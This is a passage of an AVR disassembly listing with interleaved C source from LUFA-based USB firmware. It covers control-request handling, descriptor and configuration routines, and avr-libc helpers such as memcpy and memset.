				GCC_MEMORY_BARRIER();

				#if (ARCH == ARCH_AVR8)
				SREG = GlobalIntState;
    6f96:	3f bf       	out	0x3f, r19	; 63

    USB_Device_GetSerialString(SignatureDescriptor.UnicodeString);

    if (NULL != LUFA_DREG_HOOK_INTERNAL_SERIAL)
    6f98:	e0 91 08 01 	lds	r30, 0x0108	; 0x800108 <LUFA_DREG_HOOK_INTERNAL_SERIAL>
    6f9c:	f0 91 09 01 	lds	r31, 0x0109	; 0x800109 <LUFA_DREG_HOOK_INTERNAL_SERIAL+0x1>
    6fa0:	30 97       	sbiw	r30, 0x00	; 0
    6fa2:	29 f0       	breq	.+10     	; 0x6fae <USB_Device_GetInternalSerialDescriptor+0x86>
    {
        LUFA_DREG_HOOK_INTERNAL_SERIAL(SignatureDescriptor.UnicodeString, INTERNAL_SERIAL_LENGTH_BITS / 4);
    6fa4:	64 e1       	ldi	r22, 0x14	; 20
    6fa6:	70 e0       	ldi	r23, 0x00	; 0
    6fa8:	ce 01       	movw	r24, r28
    6faa:	03 96       	adiw	r24, 0x03	; 3
    6fac:	09 95       	icall
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6fae:	08 ee       	ldi	r16, 0xE8	; 232
    6fb0:	10 e0       	ldi	r17, 0x00	; 0
    6fb2:	f8 01       	movw	r30, r16
    6fb4:	80 81       	ld	r24, Z
    6fb6:	87 7f       	andi	r24, 0xF7	; 247
    6fb8:	80 83       	st	Z, r24
    }
    
    Endpoint_ClearSETUP();

    Endpoint_Write_Control_Stream_LE(&SignatureDescriptor, sizeof(SignatureDescriptor));
    6fba:	6a e2       	ldi	r22, 0x2A	; 42
    6fbc:	70 e0       	ldi	r23, 0x00	; 0
    6fbe:	ce 01       	movw	r24, r28
    6fc0:	01 96       	adiw	r24, 0x01	; 1
    6fc2:	02 dc       	rcall	.-2044   	; 0x67c8 <Endpoint_Write_Control_Stream_LE>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    6fc4:	f8 01       	movw	r30, r16
    6fc6:	80 81       	ld	r24, Z
    6fc8:	8b 77       	andi	r24, 0x7B	; 123
    6fca:	80 83       	st	Z, r24
    Endpoint_ClearOUT();
}
    6fcc:	aa 96       	adiw	r28, 0x2a	; 42
    6fce:	0f b6       	in	r0, 0x3f	; 63
    6fd0:	f8 94       	cli
    6fd2:	de bf       	out	0x3e, r29	; 62
    6fd4:	0f be       	out	0x3f, r0	; 63
    6fd6:	cd bf       	out	0x3d, r28	; 61
    6fd8:	df 91       	pop	r29
    6fda:	cf 91       	pop	r28
    6fdc:	1f 91       	pop	r17
    6fde:	0f 91       	pop	r16
    6fe0:	08 95       	ret

00006fe2 <USB_Device_GetDescriptor>:
#endif

static void USB_Device_GetDescriptor(void)
{
    6fe2:	0f 93       	push	r16
    6fe4:	1f 93       	push	r17
    6fe6:	cf 93       	push	r28
    6fe8:	df 93       	push	r29
    6fea:	00 d0       	rcall	.+0      	; 0x6fec <USB_Device_GetDescriptor+0xa>
    6fec:	cd b7       	in	r28, 0x3d	; 61
    6fee:	de b7       	in	r29, 0x3e	; 62
	    !(defined(USE_FLASH_DESCRIPTORS) || defined(USE_EEPROM_DESCRIPTORS) || defined(USE_RAM_DESCRIPTORS))
	uint8_t DescriptorAddressSpace;
	#endif

	#if !defined(NO_INTERNAL_SERIAL) && (USE_INTERNAL_SERIAL != NO_DESCRIPTOR)
	if (USB_ControlRequest.wValue == ((DTYPE_String << 8) | USE_INTERNAL_SERIAL))
    6ff0:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6ff4:	90 91 f7 0d 	lds	r25, 0x0DF7	; 0x800df7 <USB_ControlRequest+0x3>
    6ff8:	8c 3d       	cpi	r24, 0xDC	; 220
    6ffa:	23 e0       	ldi	r18, 0x03	; 3
    6ffc:	92 07       	cpc	r25, r18
    6ffe:	11 f4       	brne	.+4      	; 0x7004 <USB_Device_GetDescriptor+0x22>
	{
		USB_Device_GetInternalSerialDescriptor();
    7000:	93 df       	rcall	.-218    	; 0x6f28 <USB_Device_GetInternalSerialDescriptor>
		return;
    7002:	19 c0       	rjmp	.+50     	; 0x7036 <USB_Device_GetDescriptor+0x54>
	}
	#endif

	if ((DescriptorSize = CALLBACK_USB_GetDescriptor(USB_ControlRequest.wValue, USB_ControlRequest.wIndex,
    7004:	60 91 f8 0d 	lds	r22, 0x0DF8	; 0x800df8 <USB_ControlRequest+0x4>
    7008:	70 91 f9 0d 	lds	r23, 0x0DF9	; 0x800df9 <USB_ControlRequest+0x5>
    700c:	ae 01       	movw	r20, r28
    700e:	4f 5f       	subi	r20, 0xFF	; 255
    7010:	5f 4f       	sbci	r21, 0xFF	; 255
    7012:	0e 94 93 02 	call	0x526	; 0x526 <CALLBACK_USB_GetDescriptor>
    7016:	00 97       	sbiw	r24, 0x00	; 0
    7018:	71 f0       	breq	.+28     	; 0x7036 <USB_Device_GetDescriptor+0x54>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    701a:	08 ee       	ldi	r16, 0xE8	; 232
    701c:	10 e0       	ldi	r17, 0x00	; 0
    701e:	f8 01       	movw	r30, r16
    7020:	20 81       	ld	r18, Z
    7022:	27 7f       	andi	r18, 0xF7	; 247
    7024:	20 83       	st	Z, r18
	}

	Endpoint_ClearSETUP();

	#if defined(USE_RAM_DESCRIPTORS) || !defined(ARCH_HAS_MULTI_ADDRESS_SPACE)
	Endpoint_Write_Control_Stream_LE(DescriptorPointer, DescriptorSize);
    7026:	bc 01       	movw	r22, r24
    7028:	89 81       	ldd	r24, Y+1	; 0x01
    702a:	9a 81       	ldd	r25, Y+2	; 0x02
    702c:	cd db       	rcall	.-2150   	; 0x67c8 <Endpoint_Write_Control_Stream_LE>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    702e:	f8 01       	movw	r30, r16
    7030:	80 81       	ld	r24, Z
    7032:	8b 77       	andi	r24, 0x7B	; 123
    7034:	80 83       	st	Z, r24
	else
	  Endpoint_Write_Control_Stream_LE(DescriptorPointer, DescriptorSize);
	#endif

	Endpoint_ClearOUT();
}
    7036:	0f 90       	pop	r0
    7038:	0f 90       	pop	r0
    703a:	df 91       	pop	r29
    703c:	cf 91       	pop	r28
    703e:	1f 91       	pop	r17
    7040:	0f 91       	pop	r16
    7042:	08 95       	ret

00007044 <USB_Device_SetConfiguration>:
}

static void USB_Device_SetConfiguration(void)
{
	#if defined(FIXED_NUM_CONFIGURATIONS)
	if ((uint8_t)USB_ControlRequest.wValue > FIXED_NUM_CONFIGURATIONS)
    7044:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    7048:	90 91 f7 0d 	lds	r25, 0x0DF7	; 0x800df7 <USB_ControlRequest+0x3>
    704c:	99 27       	eor	r25, r25
    704e:	02 97       	sbiw	r24, 0x02	; 2
    7050:	ec f4       	brge	.+58     	; 0x708c <USB_Device_SetConfiguration+0x48>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    7052:	e8 ee       	ldi	r30, 0xE8	; 232
    7054:	f0 e0       	ldi	r31, 0x00	; 0
    7056:	80 81       	ld	r24, Z
    7058:	87 7f       	andi	r24, 0xF7	; 247
    705a:	80 83       	st	Z, r24
	#endif
	#endif

	Endpoint_ClearSETUP();

	USB_Device_ConfigurationNumber = (uint8_t)USB_ControlRequest.wValue;
    705c:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    7060:	80 93 ef 0d 	sts	0x0DEF, r24	; 0x800def <USB_Device_ConfigurationNumber>

	Endpoint_ClearStatusStage();
    7064:	da dc       	rcall	.-1612   	; 0x6a1a <Endpoint_ClearStatusStage>

	if (USB_Device_ConfigurationNumber)
    7066:	80 91 ef 0d 	lds	r24, 0x0DEF	; 0x800def <USB_Device_ConfigurationNumber>
    706a:	88 23       	and	r24, r24
    706c:	21 f0       	breq	.+8      	; 0x7076 <USB_Device_SetConfiguration+0x32>
	  USB_DeviceState = DEVICE_STATE_Configured;
    706e:	84 e0       	ldi	r24, 0x04	; 4
    7070:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
    7074:	09 c0       	rjmp	.+18     	; 0x7088 <USB_Device_SetConfiguration+0x44>
			}

			static inline bool USB_Device_IsAddressSet(void) ATTR_ALWAYS_INLINE ATTR_WARN_UNUSED_RESULT;
			static inline bool USB_Device_IsAddressSet(void)
			{
				return (UDADDR & (1 << ADDEN));
    7076:	80 91 e3 00 	lds	r24, 0x00E3	; 0x8000e3 <__TEXT_REGION_LENGTH__+0x7e00e3>
	else
	  USB_DeviceState = (USB_Device_IsAddressSet()) ? DEVICE_STATE_Configured : DEVICE_STATE_Powered;
    707a:	88 23       	and	r24, r24
    707c:	14 f4       	brge	.+4      	; 0x7082 <USB_Device_SetConfiguration+0x3e>
    707e:	84 e0       	ldi	r24, 0x04	; 4
    7080:	01 c0       	rjmp	.+2      	; 0x7084 <USB_Device_SetConfiguration+0x40>
    7082:	81 e0       	ldi	r24, 0x01	; 1
    7084:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>

	EVENT_USB_Device_ConfigurationChanged();
    7088:	0c 94 fe 1c 	jmp	0x39fc	; 0x39fc <EVENT_USB_Device_ConfigurationChanged>
    708c:	08 95       	ret

0000708e <USB_Device_ProcessControlRequest>:
	USB_ControlRequest.wIndex        = Endpoint_Read_16_LE();
	USB_ControlRequest.wLength       = Endpoint_Read_16_LE();
	#else
	uint8_t* RequestHeader = (uint8_t*)&USB_ControlRequest;

	for (uint8_t RequestHeaderByte = 0; RequestHeaderByte < sizeof(USB_Request_Header_t); RequestHeaderByte++)
    708e:	80 e0       	ldi	r24, 0x00	; 0
	USB_ControlRequest.bRequest      = Endpoint_Read_8();
	USB_ControlRequest.wValue        = Endpoint_Read_16_LE();
	USB_ControlRequest.wIndex        = Endpoint_Read_16_LE();
	USB_ControlRequest.wLength       = Endpoint_Read_16_LE();
	#else
	uint8_t* RequestHeader = (uint8_t*)&USB_ControlRequest;
    7090:	e4 ef       	ldi	r30, 0xF4	; 244
    7092:	fd e0       	ldi	r31, 0x0D	; 13

	for (uint8_t RequestHeaderByte = 0; RequestHeaderByte < sizeof(USB_Request_Header_t); RequestHeaderByte++)
    7094:	05 c0       	rjmp	.+10     	; 0x70a0 <USB_Device_ProcessControlRequest+0x12>
			 *  \return Next byte in the currently selected endpoint's FIFO buffer.
			 */
			static inline uint8_t Endpoint_Read_8(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_Read_8(void)
			{
				return UEDATX;
    7096:	90 91 f1 00 	lds	r25, 0x00F1	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
	  *(RequestHeader++) = Endpoint_Read_8();
    709a:	90 83       	st	Z, r25
	USB_ControlRequest.wIndex        = Endpoint_Read_16_LE();
	USB_ControlRequest.wLength       = Endpoint_Read_16_LE();
	#else
	uint8_t* RequestHeader = (uint8_t*)&USB_ControlRequest;

	for (uint8_t RequestHeaderByte = 0; RequestHeaderByte < sizeof(USB_Request_Header_t); RequestHeaderByte++)
    709c:	8f 5f       	subi	r24, 0xFF	; 255
	  *(RequestHeader++) = Endpoint_Read_8();
    709e:	31 96       	adiw	r30, 0x01	; 1
	USB_ControlRequest.wIndex        = Endpoint_Read_16_LE();
	USB_ControlRequest.wLength       = Endpoint_Read_16_LE();
	#else
	uint8_t* RequestHeader = (uint8_t*)&USB_ControlRequest;

	for (uint8_t RequestHeaderByte = 0; RequestHeaderByte < sizeof(USB_Request_Header_t); RequestHeaderByte++)
    70a0:	88 30       	cpi	r24, 0x08	; 8
    70a2:	c8 f3       	brcs	.-14     	; 0x7096 <USB_Device_ProcessControlRequest+0x8>
	  *(RequestHeader++) = Endpoint_Read_8();
	#endif

	EVENT_USB_Device_ControlRequest();
    70a4:	0e 94 22 1d 	call	0x3a44	; 0x3a44 <EVENT_USB_Device_ControlRequest>
			 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsSETUPReceived(void)
			{
				return ((UEINTX & (1 << RXSTPI)) ? true : false);
    70a8:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

	if (Endpoint_IsSETUPReceived())
    70ac:	83 ff       	sbrs	r24, 3
    70ae:	30 c0       	rjmp	.+96     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
	{
		uint8_t bmRequestType = USB_ControlRequest.bmRequestType;
    70b0:	e4 ef       	ldi	r30, 0xF4	; 244
    70b2:	fd e0       	ldi	r31, 0x0D	; 13
    70b4:	90 81       	ld	r25, Z

		switch (USB_ControlRequest.bRequest)
    70b6:	81 81       	ldd	r24, Z+1	; 0x01
    70b8:	85 30       	cpi	r24, 0x05	; 5
    70ba:	d1 f0       	breq	.+52     	; 0x70f0 <USB_Device_ProcessControlRequest+0x62>
    70bc:	30 f4       	brcc	.+12     	; 0x70ca <USB_Device_ProcessControlRequest+0x3c>
    70be:	81 30       	cpi	r24, 0x01	; 1
    70c0:	89 f0       	breq	.+34     	; 0x70e4 <USB_Device_ProcessControlRequest+0x56>
    70c2:	50 f0       	brcs	.+20     	; 0x70d8 <USB_Device_ProcessControlRequest+0x4a>
    70c4:	83 30       	cpi	r24, 0x03	; 3
    70c6:	71 f0       	breq	.+28     	; 0x70e4 <USB_Device_ProcessControlRequest+0x56>
    70c8:	23 c0       	rjmp	.+70     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    70ca:	88 30       	cpi	r24, 0x08	; 8
    70cc:	d1 f0       	breq	.+52     	; 0x7102 <USB_Device_ProcessControlRequest+0x74>
    70ce:	89 30       	cpi	r24, 0x09	; 9
    70d0:	e1 f0       	breq	.+56     	; 0x710a <USB_Device_ProcessControlRequest+0x7c>
    70d2:	86 30       	cpi	r24, 0x06	; 6
    70d4:	e9 f4       	brne	.+58     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    70d6:	10 c0       	rjmp	.+32     	; 0x70f8 <USB_Device_ProcessControlRequest+0x6a>
		{
			case REQ_GetStatus:
				if ((bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_DEVICE)) ||
    70d8:	90 38       	cpi	r25, 0x80	; 128
    70da:	11 f0       	breq	.+4      	; 0x70e0 <USB_Device_ProcessControlRequest+0x52>
    70dc:	92 38       	cpi	r25, 0x82	; 130
    70de:	c1 f4       	brne	.+48     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
					(bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_ENDPOINT)))
				{
					USB_Device_GetStatus();
    70e0:	77 de       	rcall	.-786    	; 0x6dd0 <USB_Device_GetStatus>
    70e2:	16 c0       	rjmp	.+44     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
				}

				break;
			case REQ_ClearFeature:
			case REQ_SetFeature:
				if ((bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_STANDARD | REQREC_DEVICE)) ||
    70e4:	99 23       	and	r25, r25
    70e6:	11 f0       	breq	.+4      	; 0x70ec <USB_Device_ProcessControlRequest+0x5e>
    70e8:	92 30       	cpi	r25, 0x02	; 2
					(bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_STANDARD | REQREC_ENDPOINT)))
				{
					USB_Device_ClearSetFeature();
    70ea:	91 f4       	brne	.+36     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    70ec:	a1 de       	rcall	.-702    	; 0x6e30 <USB_Device_ClearSetFeature>
    70ee:	10 c0       	rjmp	.+32     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
				}

				break;
			case REQ_SetAddress:
				if (bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_STANDARD | REQREC_DEVICE))
    70f0:	91 11       	cpse	r25, r1
				  USB_Device_SetAddress();
    70f2:	0e c0       	rjmp	.+28     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    70f4:	e9 de       	rcall	.-558    	; 0x6ec8 <USB_Device_SetAddress>
    70f6:	0c c0       	rjmp	.+24     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>

				break;
			case REQ_GetDescriptor:
				if ((bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_DEVICE)) ||
    70f8:	90 58       	subi	r25, 0x80	; 128
    70fa:	92 30       	cpi	r25, 0x02	; 2
					(bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_INTERFACE)))
				{
					USB_Device_GetDescriptor();
    70fc:	48 f4       	brcc	.+18     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    70fe:	71 df       	rcall	.-286    	; 0x6fe2 <USB_Device_GetDescriptor>
				}

				break;
			case REQ_GetConfiguration:
				if (bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_DEVICE))
    7100:	07 c0       	rjmp	.+14     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    7102:	90 38       	cpi	r25, 0x80	; 128
				  USB_Device_GetConfiguration();
    7104:	29 f4       	brne	.+10     	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    7106:	02 df       	rcall	.-508    	; 0x6f0c <USB_Device_GetConfiguration>

				break;
			case REQ_SetConfiguration:
				if (bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_STANDARD | REQREC_DEVICE))
    7108:	03 c0       	rjmp	.+6      	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    710a:	91 11       	cpse	r25, r1
				  USB_Device_SetConfiguration();
    710c:	01 c0       	rjmp	.+2      	; 0x7110 <USB_Device_ProcessControlRequest+0x82>
    710e:	9a df       	rcall	.-204    	; 0x7044 <USB_Device_SetConfiguration>
    7110:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
			default:
				break;
		}
	}

	if (Endpoint_IsSETUPReceived())
    7114:	83 ff       	sbrs	r24, 3
    7116:	0a c0       	rjmp	.+20     	; 0x712c <USB_Device_ProcessControlRequest+0x9e>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    7118:	e8 ee       	ldi	r30, 0xE8	; 232
    711a:	f0 e0       	ldi	r31, 0x00	; 0
    711c:	80 81       	ld	r24, Z
    711e:	87 7f       	andi	r24, 0xF7	; 247
    7120:	80 83       	st	Z, r24
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_StallTransaction(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_StallTransaction(void)
			{
				UECONX |= (1 << STALLRQ);
    7122:	eb ee       	ldi	r30, 0xEB	; 235
    7124:	f0 e0       	ldi	r31, 0x00	; 0
    7126:	80 81       	ld	r24, Z
    7128:	80 62       	ori	r24, 0x20	; 32
    712a:	80 83       	st	Z, r24
    712c:	08 95       	ret

0000712e <USB_Event_Stub>:
#define  __INCLUDE_FROM_EVENTS_C
#define  __INCLUDE_FROM_USB_DRIVER
#include "Events.h"

void USB_Event_Stub(void)
{
    712e:	08 95       	ret

00007130 <USB_DeviceTask>:
	#endif
}

#if defined(USB_CAN_BE_DEVICE)
static void USB_DeviceTask(void)
{
    7130:	cf 93       	push	r28
	if (USB_DeviceState == DEVICE_STATE_Unattached)
    7132:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    7136:	88 23       	and	r24, r24
    7138:	99 f0       	breq	.+38     	; 0x7160 <USB_DeviceTask+0x30>
			 */
			static inline uint8_t Endpoint_GetCurrentEndpoint(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetCurrentEndpoint(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					return ((UENUM & ENDPOINT_EPNUM_MASK) | Endpoint_GetEndpointDirection());
    713a:	c0 91 e9 00 	lds	r28, 0x00E9	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    713e:	cf 70       	andi	r28, 0x0F	; 15
			 *  \return The currently selected endpoint's direction, as a \c ENDPOINT_DIR_* mask.
			 */
			static inline uint8_t Endpoint_GetEndpointDirection(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetEndpointDirection(void)
			{
				return (UECFG0X & (1 << EPDIR)) ? ENDPOINT_DIR_IN : ENDPOINT_DIR_OUT;
    7140:	80 91 ec 00 	lds	r24, 0x00EC	; 0x8000ec <__TEXT_REGION_LENGTH__+0x7e00ec>
    7144:	98 2f       	mov	r25, r24
    7146:	91 70       	andi	r25, 0x01	; 1
    7148:	80 fd       	sbrc	r24, 0
    714a:	90 e8       	ldi	r25, 0x80	; 128
			 */
			static inline uint8_t Endpoint_GetCurrentEndpoint(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetCurrentEndpoint(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					return ((UENUM & ENDPOINT_EPNUM_MASK) | Endpoint_GetEndpointDirection());
    714c:	c9 2b       	or	r28, r25
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    714e:	10 92 e9 00 	sts	0x00E9, r1	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsSETUPReceived(void)
			{
				return ((UEINTX & (1 << RXSTPI)) ? true : false);
    7152:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

	uint8_t PrevEndpoint = Endpoint_GetCurrentEndpoint();

	Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);

	if (Endpoint_IsSETUPReceived())
    7156:	83 fd       	sbrc	r24, 3
	  USB_Device_ProcessControlRequest();
    7158:	9a df       	rcall	.-204    	; 0x708e <USB_Device_ProcessControlRequest>
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    715a:	cf 70       	andi	r28, 0x0F	; 15
    715c:	c0 93 e9 00 	sts	0x00E9, r28	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>

	Endpoint_SelectEndpoint(PrevEndpoint);
}
    7160:	cf 91       	pop	r28
    7162:	08 95       	ret

00007164 <USB_USBTask>:
		else if (USB_CurrentMode == USB_MODE_Host)
		  USB_HostTask();
	#elif defined(USB_CAN_BE_HOST)
		USB_HostTask();
	#elif defined(USB_CAN_BE_DEVICE)
		USB_DeviceTask();
    7164:	e5 cf       	rjmp	.-54     	; 0x7130 <USB_DeviceTask>
    7166:	08 95       	ret

00007168 <__udivmodsi4>:
    7168:	a1 e2       	ldi	r26, 0x21	; 33
    716a:	1a 2e       	mov	r1, r26
    716c:	aa 1b       	sub	r26, r26
    716e:	bb 1b       	sub	r27, r27
    7170:	fd 01       	movw	r30, r26
    7172:	0d c0       	rjmp	.+26     	; 0x718e <__udivmodsi4_ep>

00007174 <__udivmodsi4_loop>:
    7174:	aa 1f       	adc	r26, r26
    7176:	bb 1f       	adc	r27, r27
    7178:	ee 1f       	adc	r30, r30
    717a:	ff 1f       	adc	r31, r31
    717c:	a2 17       	cp	r26, r18
    717e:	b3 07       	cpc	r27, r19
    7180:	e4 07       	cpc	r30, r20
    7182:	f5 07       	cpc	r31, r21
    7184:	20 f0       	brcs	.+8      	; 0x718e <__udivmodsi4_ep>
    7186:	a2 1b       	sub	r26, r18
    7188:	b3 0b       	sbc	r27, r19
    718a:	e4 0b       	sbc	r30, r20
    718c:	f5 0b       	sbc	r31, r21

0000718e <__udivmodsi4_ep>:
    718e:	66 1f       	adc	r22, r22
    7190:	77 1f       	adc	r23, r23
    7192:	88 1f       	adc	r24, r24
    7194:	99 1f       	adc	r25, r25
    7196:	1a 94       	dec	r1
    7198:	69 f7       	brne	.-38     	; 0x7174 <__udivmodsi4_loop>
    719a:	60 95       	com	r22
    719c:	70 95       	com	r23
    719e:	80 95       	com	r24
    71a0:	90 95       	com	r25
    71a2:	9b 01       	movw	r18, r22
    71a4:	ac 01       	movw	r20, r24
    71a6:	bd 01       	movw	r22, r26
    71a8:	cf 01       	movw	r24, r30
    71aa:	08 95       	ret

000071ac <__umulhisi3>:
    71ac:	a2 9f       	mul	r26, r18
    71ae:	b0 01       	movw	r22, r0
    71b0:	b3 9f       	mul	r27, r19
    71b2:	c0 01       	movw	r24, r0
    71b4:	a3 9f       	mul	r26, r19
    71b6:	70 0d       	add	r23, r0
    71b8:	81 1d       	adc	r24, r1
    71ba:	11 24       	eor	r1, r1
    71bc:	91 1d       	adc	r25, r1
    71be:	b2 9f       	mul	r27, r18
    71c0:	70 0d       	add	r23, r0
    71c2:	81 1d       	adc	r24, r1
    71c4:	11 24       	eor	r1, r1
    71c6:	91 1d       	adc	r25, r1
    71c8:	08 95       	ret

000071ca <__muluhisi3>:
    71ca:	f0 df       	rcall	.-32     	; 0x71ac <__umulhisi3>
    71cc:	a5 9f       	mul	r26, r21
    71ce:	90 0d       	add	r25, r0
    71d0:	b4 9f       	mul	r27, r20
    71d2:	90 0d       	add	r25, r0
    71d4:	a4 9f       	mul	r26, r20
    71d6:	80 0d       	add	r24, r0
    71d8:	91 1d       	adc	r25, r1
    71da:	11 24       	eor	r1, r1
    71dc:	08 95       	ret

000071de <isgraph>:
    71de:	80 32       	cpi	r24, 0x20	; 32
    71e0:	09 f0       	breq	.+2      	; 0x71e4 <isprint+0x2>

000071e2 <isprint>:
    71e2:	91 11       	cpse	r25, r1
    71e4:	ec c2       	rjmp	.+1496   	; 0x77be <__ctype_isfalse>
    71e6:	80 52       	subi	r24, 0x20	; 32
    71e8:	8f 55       	subi	r24, 0x5F	; 95
    71ea:	e0 f7       	brcc	.-8      	; 0x71e4 <isprint+0x2>
    71ec:	08 95       	ret

000071ee <toupper>:
    71ee:	91 11       	cpse	r25, r1
    71f0:	08 95       	ret
    71f2:	81 56       	subi	r24, 0x61	; 97
    71f4:	8a 51       	subi	r24, 0x1A	; 26
    71f6:	08 f4       	brcc	.+2      	; 0x71fa <toupper+0xc>
    71f8:	80 52       	subi	r24, 0x20	; 32
    71fa:	85 58       	subi	r24, 0x85	; 133
    71fc:	08 95       	ret

000071fe <memcmp>:
    71fe:	fb 01       	movw	r30, r22
    7200:	dc 01       	movw	r26, r24
    7202:	04 c0       	rjmp	.+8      	; 0x720c <memcmp+0xe>
    7204:	8d 91       	ld	r24, X+
    7206:	01 90       	ld	r0, Z+
    7208:	80 19       	sub	r24, r0
    720a:	21 f4       	brne	.+8      	; 0x7214 <memcmp+0x16>
    720c:	41 50       	subi	r20, 0x01	; 1
    720e:	50 40       	sbci	r21, 0x00	; 0
    7210:	c8 f7       	brcc	.-14     	; 0x7204 <memcmp+0x6>
    7212:	88 1b       	sub	r24, r24
    7214:	99 0b       	sbc	r25, r25
    7216:	08 95       	ret

00007218 <memcpy>:
    7218:	fb 01       	movw	r30, r22
    721a:	dc 01       	movw	r26, r24
    721c:	02 c0       	rjmp	.+4      	; 0x7222 <memcpy+0xa>
    721e:	01 90       	ld	r0, Z+
    7220:	0d 92       	st	X+, r0
    7222:	41 50       	subi	r20, 0x01	; 1
    7224:	50 40       	sbci	r21, 0x00	; 0
    7226:	d8 f7       	brcc	.-10     	; 0x721e <memcpy+0x6>
    7228:	08 95       	ret

0000722a <memset>:
    722a:	dc 01       	movw	r26, r24
    722c:	01 c0       	rjmp	.+2      	; 0x7230 <memset+0x6>
    722e:	6d 93       	st	X+, r22
    7230:	41 50       	subi	r20, 0x01	; 1
    7232:	50 40       	sbci	r21, 0x00	; 0
    7234:	e0 f7       	brcc	.-8      	; 0x722e <memset+0x4>
    7236:	08 95       	ret

00007238 <strchr>:
    7238:	fc 01       	movw	r30, r24
    723a:	81 91       	ld	r24, Z+
